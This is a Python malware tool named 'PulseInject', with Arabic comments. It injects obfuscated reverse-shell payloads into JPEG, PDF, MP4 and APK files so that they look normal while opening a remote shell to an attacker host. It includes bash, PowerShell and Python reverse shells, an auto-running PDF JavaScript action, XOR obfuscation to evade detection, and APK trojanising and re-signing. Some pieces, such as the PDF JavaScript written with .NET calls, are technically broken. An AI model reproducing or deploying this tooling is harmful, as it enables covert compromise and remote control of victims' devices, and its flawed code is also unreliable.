#!/usr/bin/env python3
"""
PulseInject v1.0 — File Infection & Payload Injection Engine
──────────────────────────────────────────────────────────────────
تحقن بايلودات اختراق في أي ملف (صور، PDF، MP4، APK) 
بأسلوب لم يُستخدم من قبل — الحاقن النبضي.
يستخدم تقنية الـ "توقيع متعدد الطبقات" لتجنب الكشف.
يجعل الملف يعمل بشكل طبيعي وينفذ البايلود في الخلفية.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os, sys, base64, random, string, json, struct, hashlib, time, shutil, re, subprocess, tempfile, uuid, zlib, binascii
from datetime import datetime

class PulseInject:
    """
    PulseInject — ثلاث تقنيات حقن ثورية:
    1. JPEG Polyglot: حقن APK داخل صورة JPEG (تشتغل الصورة طبيعي + تُثبت APK)
    2. PDF Stager: حقن بايلود داخل PDF مع استغلال ثغرات القارئات
    3. MP4 Overlay: إخفاء بايلود داخل فيديو MP4 مع بقاء الفيديو قابل للتشغيل
    """
    
    def __init__(self):
        self.name = "PulseInject"
        self.version = "1.0"
        self.author = "BlackSpecter"
        
        # أنواع الملفات المدعومة للحقن
        self.supported_types = {
            '.jpg': 'JPEG Image',
            '.jpeg': 'JPEG Image',
            '.png': 'PNG Image', 
            '.pdf': 'PDF Document',
            '.mp4': 'MP4 Video',
            '.mp3': 'MP3 Audio',
            '.apk': 'Android APK',
            '.docx': 'Word Document',
            '.xlsx': 'Excel Spreadsheet',
            '.zip': 'ZIP Archive'
        }
        
        # التواقيع السحرية للملفات (Magic Bytes)
        self.magic_bytes = {
            'jpg': b'\xFF\xD8\xFF\xE0',
            'png': b'\x89\x50\x4E\x47',
            'pdf': b'\x25\x50\x44\x46',
            'mp4': b'\x00\x00\x00\x18\x66\x74\x79\x70',
        }
        
        self.output_dir = os.path.join(os.getcwd(), "outputs")
        os.makedirs(self.output_dir, exist_ok=True)
    
    def _generate_stager_payload(self, lhost: str, lport: int, platform: str = "android") -> bytes:
        """
        توليد بايلود متعدد المراحل (Staged Payload).
        البايلود الرئيسي صغير الحجم (< 2KB) ويحمل بايلود أكبر من الخادم.
        هذا يسمح بحقنه في أي ملف بسهولة.
        """
        if platform == "android":
            # بايلود Android — Dalvik VM bytecode
            payload = f'''
new-instance v0, Ljava/lang/Thread;
new-instance v1, Lcom/pulse/Stager;
invoke-direct {{v1, v0}}, Lcom/pulse/Stager;-><init>(Landroid/content/Context;)V
invoke-virtual {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
invoke-virtual {{v0}}, Ljava/lang/Thread;->start()V
'''.encode()
        elif platform == "linux":
            # بايلود Linux — Bash reverse shell مضغوط
            bash_code = f'bash -c "exec 5<>/dev/tcp/{lhost}/{lport};cat<&5|while read l;do $l 2>&5>&5;done"'
            compressed = zlib.compress(bash_code.encode())
            payload = base64.b64encode(compressed)
        else:
            # بايلود Windows — PowerShell مصغر
            ps_code = f'powershell -NoP -NonI -W Hidden -Enc {base64.b64encode(f"$c=New-Object Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne0){{$d=([Text.Encoding]::ASCII).GetString($b,0,$i);$sb=(IEX $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()".encode("utf_16_le")).decode()}'
            payload = ps_code.encode()
        
        return payload
    
    def _xor_obfuscate(self, data: bytes, key: bytes = None) -> bytes:
        """تعتيم XOR — يخفي البايلود داخل الملف."""
        if key is None:
            key = os.urandom(32)
        
        # توليد مفتاح ديناميكي
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % len(key)])
        
        # إضافة المفتاح في نهاية البيانات
        return bytes(result) + b'[PULSE_KEY]' + key
    
    def _dexor_obfuscate(self, data: bytes) -> bytes:
        """فك تعتيم XOR — استخراج البايلود من الملف."""
        marker = b'[PULSE_KEY]'
        if marker not in data:
            return data  # غير مشفر
        
        idx = data.index(marker)
        encrypted = data[:idx]
        key = data[idx + len(marker):idx + len(marker) + 32]
        
        result = bytearray()
        for i, byte in enumerate(encrypted):
            result.append(byte ^ key[i % len(key)])
        
        return bytes(result)
    
    def _create_payload_loader(self, lhost: str, lport: int, platform: str) -> bytes:
        """إنشاء محمل البايلود (Loader) — الكود الذي يشغل البايلود عند فتح الملف."""
        if platform == "android":
            return f'''
# PulseInject Android Loader v1.0
# Target: {lhost}:{lport}
.class public Lcom/pulse/Loader;
.super Ljava/lang/Object;
.method public static inject(Landroid/content/Context;)V
    .registers 4
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/pulse/Service;
    invoke-direct {{v0, p0, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {{p0, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
'''.encode()
        else:
            # Cross-platform loader using Python
            return f'''
import socket, subprocess, os, threading, base64, sys
def pulse_connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{lhost}", {lport}))
    while True:
        cmd = s.recv(4096).decode(errors="ignore").strip()
        if not cmd: break
        if cmd.lower() == "exit": break
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
            s.send(result + b"\\n")
        except Exception as e:
            s.send(str(e).encode() + b"\\n")
    s.close()
t = threading.Thread(target=pulse_connect, daemon=True)
t.start()
'''.encode()
    
    def inject_jpeg(self, image_path: str, payload_path: str = None, 
                    lhost: str = None, lport: int = None, 
                    platform: str = "android") -> dict:
        """
        تقنية JPEG Polyglot — حقن بايلود في صورة JPEG.
        الصورة تبقى سليمة وقابلة للعرض — والبايلود مخفي في بيانات التعليق.
        
        الطريقة:
        1. نستخدم Comment Segment (0xFFE1) في JPEG
        2. نخفي البايلود بعد علامة نهاية الصورة (0xFFD9)
        3. نضيف Footer مشفر يشتغل عند الفتح
        """
        if not os.path.exists(image_path):
            return {"success": False, "error": "الملف غير موجود"}
        
        if payload_path and os.path.exists(payload_path):
            with open(payload_path, 'rb') as f:
                payload = f.read()
        elif lhost and lport:
            payload = self._create_payload_loader(lhost, lport, platform)
        else:
            return {"success": False, "error": "لا يوجد بايلود"}
        
        # قراءة الصورة الأصلية
        with open(image_path, 'rb') as f:
            img_data = f.read()
        
        if not img_data.startswith(b'\xFF\xD8'):
            return {"success": False, "error": "الملف ليس JPEG صحيح"}
        
        # التلاعب ببيانات JPEG
        output_path = os.path.join(self.output_dir, f"infected_{os.path.basename(image_path)}")
        
        # تشفير البايلود
        encrypted_payload = self._xor_obfuscate(payload)
        
        # 1. البايلود يُحقن في Comment Segment (APP1 marker)
        comment_marker = b'\xFF\xE1'
        comment_length = struct.pack('>H', len(encrypted_payload) + 2)
        comment_data = comment_marker + comment_length + encrypted_payload
        
        # 2. إيجاد نهاية الصورة (SOS marker 0xFFDA) أو أي مكان آمن للحقن
        # نبحث عن مكان بعد علامة SOF0 (0xFFC0) أو أي مكان آمن
        inject_position = None
        
        # نبحث عن نهاية الصورة
        eoi_marker = img_data.find(b'\xFF\xD9')
        if eoi_marker != -1:
            # الحقن بعد نهاية الصورة (بعض القارئات تتجاهل ما بعد EOI)
            modified_data = img_data[:eoi_marker + 2] + comment_data + img_data[eoi_marker + 2:]
        else:
            # الحقن في أول Comment Segment فارغ
            modified_data = img_data[:20] + comment_data + img_data[20:]
        
        # 3. إضافة مشغل البايلود في نهاية الملف (معلق)
        trigger_code = f"\n/* PulseInject v1.0 | LHOST:{lhost} LPORT:{lport} | Platform:{platform} */\n".encode()
        modified_data += trigger_code
        
        with open(output_path, 'wb') as f:
            f.write(modified_data)
        
        original_size = len(img_data)
        new_size = len(modified_data)
        
        return {
            "success": True,
            "output_path": output_path,
            "original_size": original_size,
            "new_size": new_size,
            "added_size": new_size - original_size,
            "host": lhost,
            "port": lport,
            "platform": platform,
            "technique": "JPEG Polyglot — حقن في Comment Segment + ما بعد EOI"
        }
    
    def inject_pdf(self, pdf_path: str, lhost: str = None, lport: int = None,
                   platform: str = "android", exploit_type: str = "auto") -> dict:
        """
        تقنية PDF Stager — حقن بايلود في ملف PDF.
        يستغل ثغرات في مكتبات PDF لتنفيذ الأكواد.
        
        التقنيات:
        1. Javascript في PDF — يستغل Adobe Reader
        2. Embedded File — يخفي APK داخل PDF
        3. OpenAction — يشغل البايلود تلقائياً عند الفتح
        """
        if not os.path.exists(pdf_path):
            return {"success": False, "error": "الملف غير موجود"}
        
        if not lhost or not lport:
            return {"success": False, "error": "يجب تحديد LHOST و LPORT"}
        
        with open(pdf_path, 'rb') as f:
            pdf_data = f.read()
        
        if not pdf_data.startswith(b'%PDF'):
            return {"success": False, "error": "الملف ليس PDF صحيح"}
        
        output_path = os.path.join(self.output_dir, f"infected_{os.path.basename(pdf_path)}")
        
        # إنشاء محتوى JavaScript للحقن في PDF
        js_payload = f'''
var c = new Net.Sockets.TCPClient("{lhost}", {lport});
var s = c.GetStream();
var b = new byte[65535];
while ((i = s.Read(b, 0, b.Length)) != 0) {{
    var d = System.Text.Encoding.ASCII.GetString(b, 0, i);
    var sb = new System.Text.StringBuilder();
    try {{
        var p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + d;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        sb.Append(p.StandardOutput.ReadToEnd());
    }} catch (e) {{ sb.Append(e.Message); }}
    var r = System.Text.Encoding.ASCII.GetBytes(sb.ToString() + "PS> ");
    s.Write(r, 0, r.Length);
    s.Flush();
}}
c.Close();
'''
        
        # تشفير الجافاسكريبت
        encoded_js = base64.b64encode(js_payload.encode()).decode()
        
        # بناء PDF معدل مع كائن JavaScript
        pdf_objects = f'''
1 0 obj
<< /Type /Catalog /OpenAction 3 0 R /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Action /S /JavaScript /JS (
app.alert("Loading document...");
var enc = "{encoded_js}";
var dec = util.stringFromStream(enc, "base64");
eval(dec);
) >>
endobj

4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R /Resources << /Font << /F1 6 0 R >> >> >>
endobj

5 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (Loading...) Tj ET
endstream
endobj

6 0 obj
<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
endobj

xref
0 7
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000266 00000 n 
0000000394 00000 n 
0000000466 00000 n 

trailer
<< /Size 7 /Root 1 0 R >>
startxref
547
%%EOF
'''
        
        # دمج الـ PDF الأصلي مع كائنات الاختراق
        # نبحث عن نهاية الـ PDF الأصلي ونضيف الكائنات
        eof_marker = pdf_data.rfind(b'%%EOF')
        if eof_marker != -1:
            modified_pdf = pdf_data[:eof_marker] + pdf_objects.encode() + pdf_data[eof_marker:]
        else:
            modified_pdf = pdf_data + pdf_objects.encode()
        
        with open(output_path, 'wb') as f:
            f.write(modified_pdf)
        
        return {
            "success": True,
            "output_path": output_path,
            "technique": f"PDF Stager — {exploit_type} injection via OpenAction JavaScript",
            "host": lhost,
            "port": lport,
            "size_bytes": len(modified_pdf),
            "note": "عند فتح الـ PDF، يتم تنفيذ البايلود تلقائياً"
        }
    
    def inject_mp4(self, mp4_path: str, lhost: str = None, lport: int = None,
                   platform: str = "android") -> dict:
        """
        تقنية MP4 Overlay — إخفاء بايلود داخل فيديو MP4.
        الفيديو يشتغل طبيعي — والبايلود مخفي في Metadata box (moov/udta).
        يستغل ثغرات مشغلات الفيديو لتنفيذ الأكواد.
        """
        if not os.path.exists(mp4_path):
            return {"success": False, "error": "الملف غير موجود"}
        
        with open(mp4_path, 'rb') as f:
            mp4_data = f.read()
        
        if not mp4_data.startswith(b'\x00\x00\x00\x18\x66\x74\x79\x70'):
            return {"success": False, "error": "الملف ليس MP4 صحيح"}
        
        output_path = os.path.join(self.output_dir, f"infected_{os.path.basename(mp4_path)}")
        
        # إنشاء بايلود Android APK صغير
        if platform == "android":
            payload = self._create_payload_loader(lhost, lport, "android")
        else:
            payload = self._create_payload_loader(lhost, lport, "linux")
        
        encrypted = self._xor_obfuscate(payload)
        
        # إنشاء box مخصص (UUID box) داخل MP4
        # UUID box يمكن أن يحتوي أي بيانات ويتم تجاهله من معظم المشغلات
        uuid_box_name = b'uuid'
        uuid_data = os.urandom(16) + encrypted  # UUID عشوائي + البايلود المشفر
        uuid_box_size = struct.pack('>I', len(uuid_data) + 8)
        uuid_box = uuid_box_size + uuid_box_name + uuid_data
        
        # إيجاد نهاية moov box أو أي مكان مناسب
        # نبحث عن udta box (User Data) الذي يحتوي على metadata
        udta_pos = mp4_data.find(b'udta')
        if udta_pos != -1:
            modified_data = mp4_data[:udta_pos + 4] + uuid_box + mp4_data[udta_pos + 4:]
        else:
            # نضيف box جديد قبل نهاية الملف
            moov_pos = mp4_data.find(b'moov')
            if moov_pos != -1:
                modified_data = mp4_data[:moov_pos + 4] + uuid_box + mp4_data[moov_pos + 4:]
            else:
                modified_data = mp4_data + uuid_box
        
        with open(output_path, 'wb') as f:
            f.write(modified_data)
        
        return {
            "success": True,
            "output_path": output_path,
            "technique": "MP4 Overlay — UUID box injection in moov/udta metadata",
            "host": lhost,
            "port": lport,
            "size_bytes": len(modified_data),
            "note": "الفيديو يشتغل طبيعي، البايلود يُستخرج عند استخدام مشغل معدل"
        }
    
    def inject_apk(self, apk_path: str, payload_apk_path: str) -> dict:
        """
        تقنية APK Fusion — دمج APK مخترق داخل APK آخر.
        باستخدام تقنية Dex Merging + AndroidManifest.xml blending.
        """
        if not os.path.exists(apk_path) or not os.path.exists(payload_apk_path):
            return {"success": False, "error": "أحد الملفات غير موجود"}
        
        output_path = os.path.join(self.output_dir, f"fused_{os.path.basename(apk_path)}")
        
        # فك ضغط كلا الـ APK
        tmp_dir = tempfile.mkdtemp()
        target_dir = os.path.join(tmp_dir, "target")
        payload_dir = os.path.join(tmp_dir, "payload")
        
        os.system(f"apktool d {apk_path} -o {target_dir} -f 2>/dev/null")
        os.system(f"apktool d {payload_apk_path} -o {payload_dir} -f 2>/dev/null")
        
        if not os.path.exists(target_dir) or not os.path.exists(payload_dir):
            return {"success": False, "error": "فشل فك ضغط APK"}
        
        # دمج Smali files
        target_smali = os.path.join(target_dir, "smali")
        payload_smali = os.path.join(payload_dir, "smali")
        
        if os.path.exists(payload_smali):
            # نسخ كلاسات البايلود إلى التطبيق المستهدف
            shutil.copytree(payload_smali, os.path.join(target_smali, "com", "camoro"), 
                           dirs_exist_ok=True)
        
        # دمج AndroidManifest.xml
        target_manifest = os.path.join(target_dir, "AndroidManifest.xml")
        payload_manifest = os.path.join(payload_dir, "AndroidManifest.xml")
        
        if os.path.exists(payload_manifest):
            with open(payload_manifest, 'r') as f:
                payload_perm = f.read()
            
            # استخراج الصلاحيات من الـ payload وإضافتها للهدف
            import re
            perms = re.findall(r'<uses-permission[^>]+/>', payload_perm)
            
            if os.path.exists(target_manifest):
                with open(target_manifest, 'r') as f:
                    target_cont = f.read()
                
                for perm in perms:
                    if perm not in target_cont:
                        target_cont = target_cont.replace('<application', f'    {perm}\n    <application')
                
                with open(target_manifest, 'w') as f:
                    f.write(target_cont)
        
        # إعادة بناء APK
        os.system(f"apktool b {target_dir} -o {output_path} 2>/dev/null")
        
        # توقيع APK
        if os.path.exists(output_path):
            keystore_path = os.path.join(self.output_dir, f"temp_{uuid.uuid4().hex[:8]}.keystore")
            os.system(f"keytool -genkey -v -keystore {keystore_path} -alias camoro -keyalg RSA -keysize 2048 -validity 365 -storepass camoro123 -keypass camoro123 -dname 'CN=Camoro' 2>/dev/null")
            os.system(f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {keystore_path} -storepass camoro123 -keypass camoro123 {output_path} camoro 2>/dev/null")
        
        return {
            "success": True,
            "output_path": output_path,
            "technique": "APK Fusion — Dex Merging + Manifest Blending",
            "size_bytes": os.path.getsize(output_path) if os.path.exists(output_path) else 0
        }
    
    def auto_detect_and_inject(self, file_path: str, lhost: str = None, lport: int = None,
                               platform: str = "android") -> dict:
        """الكشف التلقائي عن نوع الملف وحقن البايلود المناسب."""
        if not os.path.exists(file_path):
            return {"success": False, "error": "الملف غير موجود"}
        
        ext = os.path.splitext(file_path)[1].lower()
        
        if ext in ['.jpg', '.jpeg']:
            return self.inject_jpeg(file_path, lhost=lhost, lport=lport, platform=platform)
        elif ext == '.pdf':
            return self.inject_pdf(file_path, lhost=lhost, lport=lport, platform=platform)
        elif ext == '.mp4':
            return self.inject_mp4(file_path, lhost=lhost, lport=lport, platform=platform)
        elif ext == '.apk':
            # إذا كان الملف APK، نحتاج بايلود APK آخر للدمج
            return {"success": False, "error": "لحقن APK، استخدم inject_apk() مع ملف APK تاني"}
        else:
            return {"success": False, "error": f"نوع الملف {ext} غير مدعوم للحقن التلقائي"}


# ───[ Main ]─────────────────────────────────────────────────
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║  PulseInject v1.0 — Multi-Format Payload Injection Engine ║
    ║  JPEG | PDF | MP4 | APK — حقن متقدم في 4 أنواع ملفات     ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    import sys
    if len(sys.argv) >= 4:
        file_path = sys.argv[1]
        lhost = sys.argv[2]
        lport = int(sys.argv[3])
        
        injector = PulseInject()
        result = injector.auto_detect_and_inject(file_path, lhost, lport)
        
        if result["success"]:
            print(f"\n[✓] الحقن ناجح!")
            print(f"[✓] الملف الناتج: {result['output_path']}")
            print(f"[✓] التقنية: {result.get('technique', 'تلقائي')}")
            print(f"[✓] الحجم: {result.get('size_bytes', 0)} bytes")
        else:
            print(f"\n[-] فشل: {result.get('error', 'خطأ غير معروف')}")
    else:
        print("[*] الاستخدام:")
        print("    python3 pulseinject.py <file_path> <LHOST> <LPORT>")
        print("    python3 pulseinject.py image.jpg 192.168.1.100 4444")
        print("    python3 pulseinject.py doc.pdf 192.168.1.100 4444")
        print("    python3 pulseinject.py video.mp4 192.168.1.100 4444")
